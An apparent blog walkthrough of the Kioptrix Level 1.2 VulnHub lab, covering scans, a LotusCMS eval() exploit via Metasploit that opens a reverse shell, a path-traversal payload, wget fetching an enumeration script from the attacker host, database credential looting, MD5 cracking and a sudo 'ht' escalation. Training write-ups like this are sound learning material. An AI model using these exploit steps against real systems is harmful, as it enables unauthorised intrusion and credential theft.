---
layout: post
title: Kioptrix Level 1.2 (#3) Writeup
excerpt: Kioptrix Level 1.2 continues the Kioptrix VulnHub series, and provides great experience creativily reusing credentials, attacking common web applications, and cracking hashed passwords. We start by exploiting LotusCMS to get a shell as www-data. From there, we find MySQL credentials that we use to login to phpMyAdmin and dump hashed user passwords. Finally, after cracking and logging in using these credentials, we exploit a sudo misconfiguration that allows us to privilege escalate using the ht text editor.
tags: VulnHub
comments: true
social-share: false
---

Kioptrix Level 1.2 continues the Kioptrix VulnHub series, and provides great experience creativily reusing credentials, attacking common web applications, and cracking hashed passwords. 

We start by exploiting `LotusCMS` to get a shell as www-data. From there, we find MySQL credentials that we use to login to `phpMyAdmin` and dump hashed user passwords. 

Finally, after cracking and logging in using these credentials, we exploit a sudo misconfiguration that allows us to privilege escalate using the `ht` text editor.

# Enumeration

Some of the intro documentation mentions that it's useful to add the box to `/etc/hosts`, so let's go ahead and do that:

We'll open up the `hosts` file:

```bash
sudo vim /etc/hosts
```

And then simply add:

```bash
10.0.0.204      kio3
```

Let's proceed as usual now.

### NMAP Scans

```bash
sudo nmap -p- -Pn -sSV -A -oN Kioptrix1.2 kio3
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-28 22:56 EDT
Nmap scan report for kio3 (10.0.0.204)
Host is up (0.00011s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
| ssh-hostkey: 
|   1024 30:e3:f6:dc:2e:22:5d:17:ac:46:02:39:ad:71:cb:49 (DSA)
|_  2048 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd (RSA)
80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
|_http-title: Ligoat Security - Got Goat? Security ...
MAC Address: 08:00:27:AA:71:E0 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

So we've got port 22 and 80. Looks like this will be heavily web-app based. Cool. Let's get going.

I'll start by running Nikto on the host:

```bash
nikto -host kio3 >> nikto.txt
```

While this runs in the background, let's take a look at the webpage using Firefox:

![Viewing the webpage](/assets/img/VulnHub/Kioptrix1.2_1.PNG)

I'll click around the website and see what we can find, we can start by taking a look at the `blog` page.

![Viewing the Blog](/assets/img/VulnHub/Kioptrix1.2_2.PNG)

Not much here, but I did notice a call out to a user known as `loneferret`, let's note this as it could be a valid username for later.

Anyways, let's continue by looking at `/gallery` which is menitoned in a couple places.

![Viewing the Blog](/assets/img/VulnHub/Kioptrix1.2_3.PNG)

For the most part, this whole thing looks severely broken. Maybe looking at the source HTML will give us some clues:

![Viewing the Blog source](/assets/img/VulnHub/Kioptrix1.2_4.PNG)

Okay, one thing that immediately sticks out is the HTML comment containing:

 `<!-- <a href="gadmin">Admin</a>&nbsp;&nbsp; -->`

If you know HTML, you know that the `href` value will pull in another resource, whether from an external source or a locally hosted resource... is `gadmin` a resource on the web server?

![Trying to access `gadmin`](/assets/img/VulnHub/Kioptrix1.2_5.PNG)

Sure is! Cool. Let's note that, and look at the remaining pieces of baseline enumeration. Last thing on my list is the `login` button on the orignal homepage, let's take a look at what this redirects to:

![Taking a look at the login page](/assets/img/VulnHub/Kioptrix1.2_6.PNG)

Cool, so it's a login form to some admin panel... Looks like it's related to `LotusCMS`, let's note that down.

At this point, Nikto has finished executing, producing the following resutls:

```bash
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.0.0.204
+ Target Hostname:    kio3
+ Target Port:        80
+ Start Time:         2020-07-28 22:58:59 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
+ Cookie PHPSESSID created without the httponly flag
+ Retrieved x-powered-by header: PHP/5.2.4-2ubuntu5.6
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server may leak inodes via ETags, header found with file /favicon.ico, inode: 631780, size: 23126, mtime: Fri Jun  5 15:22:00 2009
+ Apache/2.2.8 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ PHP/5.2.4-2ubuntu5.6 appears to be outdated (current is at least 7.2.12). PHP 5.6.33, 7.0.27, 7.1.13, 7.2.1 may also current release for each branch.
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-3092: /phpmyadmin/changelog.php: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ /phpmyadmin/: phpMyAdmin directory found
+ OSVDB-3092: /phpmyadmin/Documentation.html: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
+ 7680 requests: 0 error(s) and 19 item(s) reported on remote host
+ End Time:           2020-07-28 22:59:13 (GMT-4) (14 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

Let's quickly take a look at those PHP file discosures:
```bash
/?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
/?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
/?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
/?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
```

I was too lazy to take screenshots of each, but all you need to know is that each of these reveals some PHP pics and credits, but nothing crazy. We now know that PHP is running, but we could infer that anyway from the `PHP/5.2.4-2ubuntu5.6` header.

Okay, next up is that `/phpmyadmin/` finding, let's take a look:

![/phpmyadmin/](/assets/img/VulnHub/Kioptrix1.2_7.PNG)

Another login page...

Also, if we browse `/phpmyadmin/changelog.php` we can see that the most recent changelog entry is: `2.11.3.0 (2007-12-08)`... Intersting.

# Exploitation

Okay, so at this point we have a couple curious things to continue to check out:
- The login page at `index.php?system=Admin` with the `LotusCMS` application.
- The login page at `/gallery/gadmin`
- The `/phpmyadmin/` login page and PHP version

Let's start from the top. I tried some common creds on the `LotusCMS` page, but no success... Let's do some research to see if there are exploits tied to LotusCMS.

```bash
ein@~/VulnHub/Kioptrix1.2:$ searchsploit lotusCMS
------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                           |  Path                                  
                                                                         | (/usr/share/exploitdb/)                
------------------------------------------------------------------------- ----------------------------------------
LotusCMS 3.0 - 'eval()' Remote Command Execution (Metasploit)            | exploits/php/remote/18565.rb
LotusCMS 3.0.3 - Multiple Vulnerabilities                                | exploits/php/webapps/16982.txt
------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result                                                                                             
```

Oh wow, maybe one of these works... Let's take a look at the second item on the list:

```bash
cat /usr/share/exploitdb/exploits/php/webapps/16982.txt
```

I went ahead and followed the link to [this disclosure](https://www.immuniweb.com/advisory/HTB22883). There's quite a bit here, most of which requires authentication, but let's focus on the last item:

```bash
3) Directory traversal vulnerability in LotusCMS
The vulnerability exists due to insufficient validation of input data in the "page" parameter in core/model/PageModel.php. A remote attacker can create a specially crafted HTTP request containing directory traversal sequences with NULL byte and read arbitrary files on the target system.
Exploitation example:
http://host/index.php?page=./../../../../../etc/passwd%00
```

Hmm! Let's give it a shot.

![Trying to get an LFI](/assets/img/VulnHub/Kioptrix1.2_8.PNG)

No luck.. There's also that first result which is a MetaSploit module. Let's fire up `msfconsole` real quick and try it out.

```bash
msf5 > use exploit/multi/http/lcms_php_exec 
msf5 exploit(multi/http/lcms_php_exec) > info

       Name: LotusCMS 3.0 eval() Remote Command Execution
     Module: exploit/multi/http/lcms_php_exec
   Platform: PHP
       Arch: php
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2011-03-03

Provided by:
  dflah_ <dflah_@alligatorteam.org>
  sherl0ck_ <sherl0ck_@alligatorteam.org>
  sinn3r <sinn3r@metasploit.com>

Available targets:
  Id  Name
  --  ----
  0   Automatic LotusCMS 3.0

Check supported:
  Yes

Basic options:
  Name     Current Setting  Required  Description
  ----     ---------------  --------  -----------
  Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
  RPORT    80               yes       The target port (TCP)
  SSL      false            no        Negotiate SSL/TLS for outgoing connections
  URI      /lcms/           yes       URI
  VHOST                     no        HTTP server virtual host

Payload information:
  Space: 4000
  Avoid: 1 characters

Description:
  This module exploits a vulnerability found in Lotus CMS 3.0's 
  Router() function. This is done by embedding PHP code in the 'page' 
  parameter, which will be passed to a eval call, therefore allowing 
  remote code execution. The module can either automatically pick up a 
  'page' parameter from the default page, or manually specify one in 
  the URI option. To use the automatic method, please supply the URI 
  with just a directory path, for example: "/lcms/". To manually 
  configure one, you may do: "/lcms/somepath/index.php?page=index"

References:
  https://cvedetails.com/cve/CVE-2011-0518/
  OSVDB (75095)
  http://secunia.com/secunia_research/2011-21/

msf5 exploit(multi/http/lcms_php_exec) > set URI /index.php
URI => /index.php
msf5 exploit(multi/http/lcms_php_exec) > set RHOSTS 10.0.0.204
RHOSTS => 10.0.0.204
msf5 exploit(multi/http/lcms_php_exec) > run

[*] Started reverse TCP handler on 10.0.0.168:4444 
[*] Using found page param: /index.php?page=index
[*] Sending exploit ...
[*] Sending stage (38288 bytes) to 10.0.0.204
[*] Meterpreter session 1 opened (10.0.0.168:4444 -> 10.0.0.204:46096) at 2020-07-28 23:31:50 -0400

meterpreter > getuid
Server username: www-data (33)
meterpreter > 
```

We got a shell... idk though... I hate using MetaSploit sometimes. Let's see if we can be elitist and find a manual exploit for this vuln, after all it's from `2011`. There's bound to be one.

`~~~Googling~~~`

Okay, 30 seconds later, and we found [this](https://raw.githubusercontent.com/Hood3dRob1n/LotusCMS-Exploit/master/lotusRCE.sh)

Cool, let's try running it:

```bash
ein@~/VulnHub/Kioptrix1.2:$ ./lotusRCE.sh 10.0.0.204 /index.php
```

![Anti-script kiddie](/assets/img/VulnHub/Kioptrix1.2_9.PNG)

And we got a shell as `www-data`.

# Privilege Escalation

There _are_ the two other web login panels that we didn't check out. These might be entry points, but let's continue with our shell and see if there's a path forward to root.

Let's get started by upgrading our shell to a full tty using Python:

```bash
which python
/usr/bin/python
python -c "import pty; pty.spawn('/bin/bash');"
www-data@Kioptrix3:/home/www/kioptrix3.com$ 
```

Cool! We'll go ahead and repeat the process from the [last box](https://0xash.github.io/2020-07-28-Kioptrix-Level-1.1/) and run LinEnum:

```bash
www-data@Kioptrix3:/$ which wget
which wget
/usr/bin/wget
www-data@Kioptrix3:/$ cd /tmp
cd /tmp
www-data@Kioptrix3:/tmp$ mkdir lol
mkdir lol
www-data@Kioptrix3:/tmp$ cd lol
cd lol
www-data@Kioptrix3:/tmp/lol$ wget http://10.0.0.168/LinEnum.sh
wget http://10.0.0.168/LinEnum.sh
--23:41:18--  http://10.0.0.168/LinEnum.sh
           => `LinEnum.sh'
Connecting to 10.0.0.168:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 46,631 (46K) [text/x-sh]

 0% [                                     ] 0             --.--K/s         100%[====================================>] 46,631        --.--K/s             

23:41:18 (336.00 MB/s) - `LinEnum.sh' saved [46631/46631]

www-data@Kioptrix3:/tmp/lol$ chmod +x LinEnum.sh && ./LinEnum.sh >> lol.txt
chmod +x LinEnum.sh && ./LinEnum.sh >> lol.txt
www-data@Kioptrix3:/tmp/lol$ ls -la
ls -la
total 84
drwxr-xr-x 2 www-data www-data  4096 Jul 28 23:41 .
drwxrwxrwt 5 root     root      4096 Jul 28 23:41 ..
-rwxr-xr-x 1 www-data www-data 46631 Jul 28 23:40 LinEnum.sh
-rw-r--r-- 1 www-data www-data 28137 Jul 28 23:41 lol.txt
www-data@Kioptrix3:/tmp/lol$ 
```

I'll save you from the FTP commands getting the output file back to my host, anyways, let's take a look at the interesting findings:

```bash
Linux Kioptrix3 2.6.24-24-server
```

This is really old... if we look at the rest of the output we can see some information on users that have logged onto the system:

```bash
Users that have previously logged onto the system:
Username         Port     From             Latest
root             tty1                      Mon Apr 18 11:29:13 -0400 2011
loneferret       pts/1    192.168.1.106    Sat Apr 16 08:51:58 -0400 2011
```

This confirms our assumption from the beginning that `loneferret` was a valid user on the box. Cool.

```bash
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               
tcp6       0      0 :::80                   :::*                    LISTEN      4284/sh         
tcp6       0      0 :::22                   :::*                    LISTEN      -               
```

Looks like MySQL is listening locally, might want to check this out later.

```bash
Useful file locations:
/bin/nc
/bin/netcat
/usr/bin/wget
/usr/bin/gcc
```

Cool, we have `gcc` if we need to compile stuff. Let's continue by checking off items from this list... Starting with the kernel verison:

`~~~Googling~~~`

`~~~Trying Exploits~~~`

I tried quite a few exploits, and ultimately decided to go down other avenues. I was running into dead ends, so decided to think from the beginning again...

Let's see, where did we get dropped upon getting a shell?

`/home/www/kioptrix3.com`

Wow, did we even see if we can access other home directories?

```bash
ls -la /home
total 20
drwxr-xr-x  5 root       root       4096 Apr 16  2011 .
drwxr-xr-x 21 root       root       4096 Apr 11  2011 ..
drwxr-xr-x  2 dreg       dreg       4096 Apr 16  2011 dreg
drwxr-xr-x  3 loneferret loneferret 4096 Apr 17  2011 loneferret
drwxr-xr-x  3 root       root       4096 Apr 12  2011 www
```

Keep enumerating...

```bash
ls -la /home/loneferret
total 64
drwxr-xr-x 3 loneferret loneferret  4096 Apr 17  2011 .
drwxr-xr-x 5 root       root        4096 Apr 16  2011 ..
-rw-r--r-- 1 loneferret users         13 Apr 18  2011 .bash_history
-rw-r--r-- 1 loneferret loneferret   220 Apr 11  2011 .bash_logout
-rw-r--r-- 1 loneferret loneferret  2940 Apr 11  2011 .bashrc
-rw------- 1 root       root          15 Apr 15  2011 .nano_history
-rw-r--r-- 1 loneferret loneferret   586 Apr 11  2011 .profile
drwx------ 2 loneferret loneferret  4096 Apr 14  2011 .ssh
-rw-r--r-- 1 loneferret loneferret     0 Apr 11  2011 .sudo_as_admin_successful
-rw-r--r-- 1 root       root         224 Apr 16  2011 CompanyPolicy.README
-rwxrwxr-x 1 root       root       26275 Jan 12  2011 checksec.sh
```

Hmm... Okay, let's take a look at `CompanyPolicy.README`

```bash
cat CompanyPolicy.README 
Hello new employee,
It is company policy here to use our newly installed software for editing, creating and viewing files.
Please use the command 'sudo ht'.
Failure to do so will result in you immediate termination.

DG
CEO
```

Dang. Unfortunately we can't sudo since we don't know `www-data`'s password.

I think it's time to enumerate more.

Let's look through the webapp files and see if we missed anything:

```bash
www-data@Kioptrix3:/home/www/kioptrix3.com$ ls -la
total 92
drwxr-xr-x  8 root root  4096 Apr 15  2011 .
drwxr-xr-x  3 root root  4096 Apr 12  2011 ..
drwxrwxrwx  2 root root  4096 Apr 15  2011 cache
drwxrwxrwx  8 root root  4096 Apr 14  2011 core
drwxrwxrwx  8 root root  4096 Apr 14  2011 data
-rw-r--r--  1 root root 23126 Jun  5  2009 favicon.ico
drwxr-xr-x  7 root root  4096 Apr 14  2011 gallery
-rw-r--r--  1 root root 26430 Jan 21  2007 gnu-lgpl.txt
-rw-r--r--  1 root root   399 Feb 23  2011 index.php
drwxrwxrwx 10 root root  4096 Apr 14  2011 modules
drwxrwxrwx  3 root root  4096 Apr 14  2011 style
-rw-r--r--  1 root root   243 Aug  5  2010 update.php
www-data@Kioptrix3:/home/www/kioptrix3.com$ 
```

These are all interesting... looking through them all led me to `gallery/gconfig.php`, which contains:

```php
        $GLOBALS["gallarific_mysql_server"] = "localhost";
        $GLOBALS["gallarific_mysql_database"] = "gallery";
        $GLOBALS["gallarific_mysql_username"] = "root";
        $GLOBALS["gallarific_mysql_password"] = "fuckeyou";
```

Cool. Let's truy logging into `/phpmyadmin/` with these.

![Logging into PHP admin](/assets/img/VulnHub/Kioptrix1.2_10.PNG)

Easy enough. After this I looked around through the SQL tables for a while, and eventually found some hashed user passwords in the `dev_accounts` table in the `gallery` database:

```bash
	Full Texts 	id 	username 	password
	Edit 	Delete 	1 	dreg 		0d3eccfb887aabd50f243b3f155c0f85
	Edit 	Delete 	2 	loneferret 	5badcaf789d3d1d09794d8f021f40f0e
```

Let's pipe these over to `john` and try to crack them:

```bash
ein@~/VulnHub/Kioptrix1.2:$ /usr/sbin/john --wordlist=rockyou.txt --format=RAW-MD5 passwords
Using default input encoding: UTF-8
Loaded 2 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])
fopen: rockyou.txt: No such file or directory
ein@~/VulnHub/Kioptrix1.2:$ /usr/sbin/john --wordlist=/usr/share/wordlists/rockyou.txt --format=RAW-MD5 passwords
Using default input encoding: UTF-8
Loaded 2 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])
Press 'q' or Ctrl-C to abort, almost any other key for status
starwars         (?)
Mast3r           (?)
2g 0:00:00:00 DONE (2020-07-29 01:31) 2.380g/s 12897Kp/s 12897Kc/s 12898KC/s Maswhit002..MashPt34
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed
ein@~/VulnHub/Kioptrix1.2:$ cat passwords 
0d3eccfb887aabd50f243b3f155c0f85
5badcaf789d3d1d09794d8f021f40f0e
```

Nice! so we got the cleartext password for both users. I'll start by trying to SSH as `loneferret`:

```bash
ein@~/VulnHub/Kioptrix1.2:$ ssh loneferret@kio3
The authenticity of host 'kio3 (10.0.0.204)' can't be established.
RSA key fingerprint is SHA256:NdsBnvaQieyTUKFzPjRpTVK6jDGM/xWwUi46IR/h1jU.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'kio3,10.0.0.204' (RSA) to the list of known hosts.
loneferret@kio3's password: 
Permission denied, please try again.
loneferret@kio3's password: 
Permission denied, please try again.
loneferret@kio3's password: 
Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/
Last login: Sat Apr 16 08:51:58 2011 from 192.168.1.106
loneferret@Kioptrix3:~$
```

Nice. Now let's see if we can run `ht` (mentioned in the CompanyPolicy.README file we found earlier) as sudo by checking via `sudo -l`:

```bash
loneferret@Kioptrix3:~$ sudo -l
User loneferret may run the following commands on this host:
    (root) NOPASSWD: !/usr/bin/su
    (root) NOPASSWD: /usr/local/bin/ht
```

Perfect, let's make sure our terminal is set correctly:
```bash
loneferret@Kioptrix3:~$ export TERM=xterm
```

Now we can use the `ht` text editor as root! The method I used to privesc is to edit the `/etc/sudoers` file and give us further permission. In this case I'll simply give us full rights to `/bin/su`.

![Editing `/etc/sudoers/`](/assets/img/VulnHub/Kioptrix1.2_11.PNG)

And now we can simply switch users to root:

```bash
loneferret@Kioptrix3:~$ sudo su
root@Kioptrix3:/home/loneferret# id
uid=0(root) gid=0(root) groups=0(root)
```

Nice! rooted. Let's look at `/root/Congrats.txt`

```bash
root@Kioptrix3:~# cat Congrats.txt 
Good for you for getting here.
Regardless of the matter (staying within the spirit of the game of course)
you got here, congratulations are in order. Wasn't that bad now was it.

Went in a different direction with this VM. Exploit based challenges are
nice. Helps workout that information gathering part, but sometimes we
need to get our hands dirty in other things as well.
Again, these VMs are beginner and not intented for everyone. 
Difficulty is relative, keep that in mind.

The object is to learn, do some research and have a little (legal)
fun in the process.


I hope you enjoyed this third challenge.

Steven McElrea
aka loneferret
http://www.kioptrix.com


Credit needs to be given to the creators of the gallery webapp and CMS used
for the building of the Kioptrix VM3 site.

Main page CMS: 
http://www.lotuscms.org

Gallery application: 
Gallarific 2.1 - Free Version released October 10, 2009
http://www.gallarific.com
Vulnerable version of this application can be downloaded
from the Exploit-DB website:
http://www.exploit-db.com/exploits/15891/

The HT Editor can be found here:
http://hte.sourceforge.net/downloads.html
And the vulnerable version on Exploit-DB here:
http://www.exploit-db.com/exploits/17083/


Also, all pictures were taken from Google Images, so being part of the
public domain I used them.
```

And we're done.

